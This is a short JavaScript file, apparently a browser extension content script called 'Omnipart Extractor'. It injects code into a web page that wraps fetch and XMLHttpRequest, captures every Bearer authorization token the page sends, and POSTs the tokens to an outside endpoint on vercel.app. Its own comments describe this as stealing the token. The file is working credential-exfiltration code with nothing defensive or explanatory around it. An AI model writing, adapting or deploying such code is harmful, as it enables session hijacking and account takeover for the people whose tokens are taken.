// Inject a script into the main page context to intercept all fetch requests and steal the Bearer token
const script = document.createElement('script');
script.textContent = `
    const originalFetch = window.fetch;
    window.fetch = async function(...args) {
        if (args[1] && args[1].headers) {
            let authHeader = null;
            if (args[1].headers instanceof Headers) {
                authHeader = args[1].headers.get('Authorization');
            } else {
                for (let key in args[1].headers) {
                    if (key.toLowerCase() === 'authorization') {
                        authHeader = args[1].headers[key];
                        break;
                    }
                }
            }
            if (authHeader && authHeader.toLowerCase().startsWith('bearer ')) {
                window.postMessage({ type: 'OMNIPART_TOKEN_INTERCEPT', token: authHeader }, '*');
            }
        }
        return originalFetch.apply(this, args);
    };

    const originalOpen = XMLHttpRequest.prototype.open;
    const originalSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
    
    XMLHttpRequest.prototype.open = function() {
        this._requestHeaders = {};
        return originalOpen.apply(this, arguments);
    };
    
    XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
        this._requestHeaders[header] = value;
        if (header.toLowerCase() === 'authorization' && value.toLowerCase().startsWith('bearer ')) {
            window.postMessage({ type: 'OMNIPART_TOKEN_INTERCEPT', token: value }, '*');
        }
        return originalSetRequestHeader.apply(this, arguments);
    };
`;
(document.head || document.documentElement).appendChild(script);

// Listen for the stolen token from the injected script and send it to our backend
window.addEventListener('message', (event) => {
    if (event.data && event.data.type === 'OMNIPART_TOKEN_INTERCEPT') {
        const token = event.data.token.trim();
        console.log("Omnipart Extractor caught token!");
        fetch("https://mot-reminder-quick.vercel.app/api/webhooks/omnipart", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ token })
        }).catch(err => console.error("Ext sync failed", err));
    }
});
